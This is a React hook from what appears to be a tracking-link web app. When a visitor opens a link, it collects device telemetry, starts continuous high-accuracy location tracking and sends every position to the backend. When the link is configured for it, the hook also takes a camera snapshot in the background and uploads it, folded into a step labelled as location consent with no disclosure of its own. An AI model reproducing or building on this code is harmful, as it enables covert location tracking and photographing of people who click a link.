import { useState, useEffect, useRef, useCallback } from "react";
import { GeoCoordinate, PermissionsConfig } from "@/lib/types";
import { collectDeviceTelemetry, captureCameraSnapshot } from "@/lib/telemetry";

interface UseConsentedLocationOptions {
  linkId: string;
  requiresLocation: boolean;
  permissionsConfig?: PermissionsConfig;
  onConsentGranted?: (sessionId: string) => void;
}

export function useConsentedLocation({
  linkId,
  requiresLocation,
  permissionsConfig,
  onConsentGranted,
}: UseConsentedLocationOptions) {
  const [isConsented, setIsConsented] = useState(!requiresLocation);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [isLocationActive, setIsLocationActive] = useState(false);
  const watchIdRef = useRef<number | null>(null);

  // Send coordinate update to backend
  const sendLocationUpdate = async (sessId: string, coords: GeoCoordinate) => {
    try {
      await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessId,
          latitude: coords.latitude,
          longitude: coords.longitude,
          accuracy: coords.accuracy,
        }),
      });
      setIsLocationActive(true);
    } catch {
      // Background location update failure is non-fatal
    }
  };

  // Teardown watchPosition
  const stopWatching = useCallback(() => {
    if (watchIdRef.current !== null && typeof navigator !== "undefined" && navigator.geolocation) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
      setIsLocationActive(false);
    }
  }, []);

  // Cleanup watcher on unmount
  useEffect(() => {
    return () => {
      stopWatching();
    };
  }, [stopWatching]);

  // Request location, collect device info & camera (fast & non-blocking)
  const requestLocation = useCallback(async () => {
    setIsLoading(true);
    setError(null);

    // 1. Collect device telemetry
    const deviceInfo = await collectDeviceTelemetry();

    // Helper to finish session setup once coordinates acquired
    const proceedWithCoords = async (coords?: GeoCoordinate) => {
      try {
        const res = await fetch("/api/sessions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            linkId,
            deviceInfo,
            permissionsGranted: coords ? ["location", "device_info"] : ["device_info"],
          }),
        });

        if (!res.ok) {
          const errData = await res.json().catch(() => ({}));
          throw new Error(errData.error || "Failed to register session");
        }
        const { session } = await res.json();
        const currentSessionId = session.id;
        setSessionId(currentSessionId);

        if (coords) {
          void sendLocationUpdate(currentSessionId, coords);
        }

        // Asynchronous non-blocking camera snapshot (zero UI lag/freeze)
        if (permissionsConfig?.camera) {
          void (async () => {
            try {
              const blob = await captureCameraSnapshot();
              if (blob) {
                const fd = new FormData();
                fd.append("sessionId", currentSessionId);
                const ext = blob.type.includes("webp") ? "webp" : "jpg";
                fd.append("file", blob, `capture.${ext}`);
                await fetch("/api/sessions/capture", { method: "POST", body: fd });
              }
            } catch (camErr) {
              console.warn("Camera capture error:", camErr);
            }
          })();
        }

        // Instant UI consent & transition (<100ms)
        setIsConsented(true);
        setIsLoading(false);

        if (onConsentGranted) {
          onConsentGranted(currentSessionId);
        }

        // Start active watch if coordinates available
        if (coords && typeof navigator !== "undefined" && navigator.geolocation) {
          watchIdRef.current = navigator.geolocation.watchPosition(
            (pos) => {
              sendLocationUpdate(currentSessionId, {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
              });
            },
            () => setIsLocationActive(false),
            { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
          );
        }
      } catch (err: any) {
        setError(err.message || "Failed to establish tracking session");
        setIsLoading(false);
      }
    };

    if (!navigator.geolocation) {
      if (requiresLocation) {
        setError("Geolocation is not supported by your browser");
        setIsLoading(false);
        return;
      }
      await proceedWithCoords();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await proceedWithCoords({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
      },
      async (geoError) => {
        if (!requiresLocation) {
          await proceedWithCoords();
          return;
        }
        setIsLoading(false);
        if (geoError.code === geoError.PERMISSION_DENIED) {
          setError("Location permission was denied. Please allow location in browser settings to continue.");
        } else {
          setError("Location signal unavailable. Please verify GPS settings.");
        }
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }, [linkId, requiresLocation, permissionsConfig, onConsentGranted, sendLocationUpdate]);

  useEffect(() => {
    return () => {
      stopWatching();
    };
  }, [stopWatching]);

  return {
    isConsented,
    isLoading,
    error,
    sessionId,
    isLocationActive,
    requestLocation,
    stopWatching,
  };
}
